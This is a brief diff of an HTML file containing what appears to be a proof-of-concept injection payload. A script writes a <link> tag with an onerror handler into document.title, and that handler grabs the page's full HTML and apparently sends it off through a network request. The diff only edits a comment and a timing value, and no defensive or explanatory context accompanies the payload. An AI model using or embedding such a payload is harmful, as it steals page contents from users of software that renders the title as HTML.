@@ -11,7 +11,6 @@
     <script>
       setTimeout(function() {
       // Set the document title to a new value
-      //document.addEventListener("DOMContentLoaded", function() {
       document.title = `
       <link rel="stylesheet" href="nonexistent.css" onerror="(function() {
           const htmlContent = document.documentElement.outerHTML;
@@ -25,7 +24,7 @@
           }).catch(error => console.error('Error:', error));
         })()">
         `;
-        }, 10); //change after 1 second
+        }, 10); //change after 0.01 second
     </script>
 </body>
 </html>
